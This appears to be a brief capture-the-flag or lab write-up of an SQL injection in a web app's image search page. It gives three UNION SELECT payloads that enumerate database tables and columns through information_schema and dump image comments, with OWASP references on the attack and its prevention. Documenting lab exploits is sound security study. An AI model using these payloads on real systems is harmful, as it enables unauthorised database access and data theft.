# SQL injection (search images page)

To exploit, go to the `http://$IPADDR/?page=searchimg` and write the following commands at the search field:

List all the tables and related databases:
```
1 union select table_name, table_schema from information_schema.tables
```

List all table columns and related table names:
```
1 union select column_name, table_name from information_schema.columns
```

List all comments from list_images table:
```
1 union select id, comment from Member_images.list_images
```

## References
- [Information_schema](https://dev.mysql.com/doc/refman/8.0/en/information-schema-general-table-reference.html) structure
- [SQL Injection Attack — OWASP](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLi Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQLi payload examples — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)